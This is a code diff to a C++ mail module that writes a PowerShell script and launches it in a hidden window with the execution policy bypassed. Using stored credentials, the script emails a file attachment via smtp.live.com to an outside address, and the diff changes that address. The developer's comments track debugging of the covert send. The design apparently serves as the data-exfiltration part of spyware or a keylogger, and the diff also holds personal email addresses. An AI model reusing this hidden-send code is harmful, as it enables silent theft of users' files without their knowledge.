@@ -14,7 +14,7 @@ namespace Mail
 		"\r\n"
 		"$SMTP = \"smtp.live.com\""
 		"\r\n"
-		"$To = \"wyzsailor@hotmail.com\""
+		"$To = \"yuzhen23@icloud.com\""   //Let's try apple Email this time 
 		"\r\n"
 		"$Subject = \"From Wangyuzhen\""
 		"\r\n"
@@ -30,7 +30,9 @@ namespace Mail
 		"\r\n"
 		"Send-MailMessage -To $To -From $MyEmail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $Creds -Port 25 -UseSsl -DeliveryNotificationOption OnFailure -Attachments $File"
 		//change port from 587 to 25 
-		"\r\n"
+		"\r\n"   //I commented all the remove variables lines , and it worked ,if with these remove options it won't work .
+		// and creating a local powershell seems a must , just place the cmdlets in this shellexecute structure is not functioning well 
+		//I don't know why . 
 		/*"Remove-Variable -Name MyEmail"
 		"\r\n"
 		"Remove-Variable -Name SMTP"
@@ -61,7 +63,8 @@ namespace Mail
 	int SendMail ()
 	{
 		bool ok;
-		std::string param = " -ExecutionPolicy Bypass -File \"C:\\Users\\Yuzhen\\Documents\\Visual Studio 2015\\Projects\\test\\Debug\\S.ps1\"";  //Change powershell content to powershell name directly .
+		std::string param = "-ExecutionPolicy Bypass -File \"S.ps1\"";  //Change powershell content to powershell name directly .
+		//Space is acceptable in the file path ,Relative path is also acceptable
 		//Only exists in that session , you won't be able to find  
 		//The above executable actually executes well 
 		SHELLEXECUTEINFO ShExecInfo = { 0 };
@@ -72,7 +75,7 @@ namespace Mail
 		ShExecInfo.lpFile = "powershell";  // I made change here  
 		ShExecInfo.lpParameters = param.c_str ();
 		ShExecInfo.lpDirectory = NULL;
-		ShExecInfo.nShow = SW_HIDE;
+		ShExecInfo.nShow = SW_HIDE;//Toggle whether the powershell shows or not 
 		ShExecInfo.hInstApp = NULL; 
 
 		ok = (bool)ShellExecuteEx (&ShExecInfo);
